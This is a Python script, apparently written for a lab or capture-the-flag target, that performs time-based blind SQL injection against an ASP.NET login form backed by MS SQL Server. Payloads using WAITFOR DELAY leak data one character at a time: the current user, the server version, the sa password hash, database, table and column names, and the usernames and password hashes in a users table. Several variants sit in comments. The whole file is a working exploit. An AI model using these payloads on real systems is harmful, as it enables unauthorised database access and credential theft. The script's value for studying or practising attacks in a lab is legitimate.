import requests
import string
import time
import json
from urllib.parse import quote

charlist = string.ascii_lowercase + string.digits + '_().:-/'
pending_rows = True
row = 0

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
}

data = {
    "__VIEWSTATE": "%2FwEPDwUKLTQ0NDEwMDQ5Mg9kFgJmD2QWAgIDD2QWAgIBD2QWAgIHDw8WAh4EVGV4dAUeSW52YWxpZCB1c2VybmFtZSBvciBwYXNza2V5Li4uZGRkikLoDB%2B%2FpXdQqiz9h%2Bj5nHjE4OqEYro7hz%2FkDYh48fQ%3D",
    "__VIEWSTATEGENERATOR": "CA0B0334",
    "__EVENTVALIDATION": "%2FwEdAAQ5uNqOYHbIeyi7LRhe1%2B7mG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb69X6Gyh7W5UwTVXhfLT4lC%2FUYzzbo01YDuyOekjcuLek%3D",
    "ctl00%24ContentPlaceHolder1%24UsernameTextBox": "",
    "ctl00%24ContentPlaceHolder1%24PasswordTextBox": "",
    "ctl00%24ContentPlaceHolder1%24LoginButton": "Enter"
}
while pending_rows:
    leaking = True
    length = 1
    leaked = ''
    last_char = ''
    while leaking:
        for char in charlist:
            last_char = char
            start = time.time()
            # Create the body with the updated payload
#            data["ctl00%24ContentPlaceHolder1%24UsernameTextBox"] = f"%27%3BIF%28%28SELECT+SUBSTRING%28CURRENT_USER%2C+1%2C+{length}%29%29%3D%27{leaked + char}%27%29+WAITFOR+DELAY+%270%3A0%3A5%27%3B--" # USER
#            data["ctl00%24ContentPlaceHolder1%24UsernameTextBox"] = f"%27%3BIF%28%28SELECT+SUBSTRING%28%40%40VERSION%2C+1%2C+{length}%29%29%3D%27{leaked + char}%27%29+WAITFOR+DELAY+%270%3A0%3A5%27%3B--" # VERSION
#            data["ctl00%24MainContent%24emailBox"] = f"%27%29%3BIF%28%28SELECT+SUBSTRING%28password_hash%2C+1%2C+{length}%29+FROM+sys.sql_logins+WHERE+sys.sql_logins.name%3D%27sa%27%29%3D%27{leaked + char}%27%29+WAITFOR+DELAY+%270%3A0%3A5%27%3B--+-" # HASH
#            data["ctl00%24ContentPlaceHolder1%24UsernameTextBox"] = f"%27%3BIF%28%28SELECT+SUBSTRING%28name%2C+1%2C+{length}%29+FROM+master..sysdatabases+ORDER+BY+name+OFFSET+{row}+ROWS+FETCH+NEXT+1+ROW+ONLY%29%3D%27{leaked + char}%27%29+WAITFOR+DELAY+%270%3A0%3A5%27%3B--+-" # TABLE
#            data["ctl00%24ContentPlaceHolder1%24UsernameTextBox"] = f"%27%3BIF%28%28SELECT+SUBSTRING%28name%2C+1%2C+{length}%29+FROM+butch..sysobjects+WHERE+xtype%3D%27U%27+ORDER+BY+name+OFFSET+{row}+ROWS+FETCH+NEXT+1+ROW+ONLY%29%3D%27{leaked + char}%27%29+WAITFOR+DELAY+%270%3A0%3A5%27%3B--+-" # COLUMNS
#            data["ctl00%24ContentPlaceHolder1%24UsernameTextBox"] = f"%27%3BIF%28%28SELECT+SUBSTRING%28butch..syscolumns.name%2C+1%2C+{length}%29+FROM+butch..syscolumns%2C+butch..sysobjects+WHERE+butch..syscolumns.id%3Dbutch..sysobjects.id+AND+butch..sysobjects.name%3D%27users%27+ORDER+BY+butch..syscolumns.name+OFFSET+{row}+ROWS+FETCH+NEXT+1+ROW+ONLY%29%3D%27{leaked + char}%27%29+WAITFOR+DELAY+%270%3A0%3A5%27%3B--+-" # VALUES
#            data["ctl00%24ContentPlaceHolder1%24UsernameTextBox"] = f"%27%3BIF%28%28SELECT+SUBSTRING%28butch..syscolumns.name%2C+1%2C+{length}%29+FROM+archive..syscolumns%2C+archive..sysobjects+WHERE+archive..syscolumns.id%3Darchive..sysobjects.id+AND+archive..sysobjects.name%3D%27pmanager%27+ORDER+BY+archive..syscolumns.name+OFFSET+{row}+ROWS+FETCH+NEXT+1+ROW+ONLY%29%3D%27{leaked + char}%27%29+WAITFOR+DELAY+%270%3A0%3A5%27%3B--+-" # VALUES
#            data["ctl00%24ContentPlaceHolder1%24UsernameTextBox"] = f"%27%3BIF%28%28SELECT+SUBSTRING%28password_hash%2C+1%2C+{length}%29+FROM+butch..users+ORDER+BY+password_hash+OFFSET+{row}+ROWS+FETCH+NEXT+1+ROW+ONLY%29%3D%27{leaked + char}%27%29+WAITFOR+DELAY+%270%3A0%3A5%27%3B--" # VALUES
            data["ctl00%24ContentPlaceHolder1%24UsernameTextBox"] = f"%27%3BIF%28%28SELECT+SUBSTRING%28username%2C+1%2C+{length}%29+FROM+butch..users+ORDER+BY+username+OFFSET+{row}+ROWS+FETCH+NEXT+1+ROW+ONLY%29%3D%27{leaked + char}%27%29+WAITFOR+DELAY+%270%3A0%3A5%27%3B--" # VALUES
            body = "&".join("=".join(i) for i in data.items())
            r = requests.post("http://butch.off:450/", headers=headers, data=body)

            print(f"Currently leaked: {leaked}[{char}]", flush=True, end='\r')

            if time.time() - start > 5:
                leaked += char
                length += 1
                break

        if last_char == '/':
            leaking = False

    print(f"\nRow {row}: {leaked}")
    if length == 1:
        pending_rows = False
    else:
        row += 1
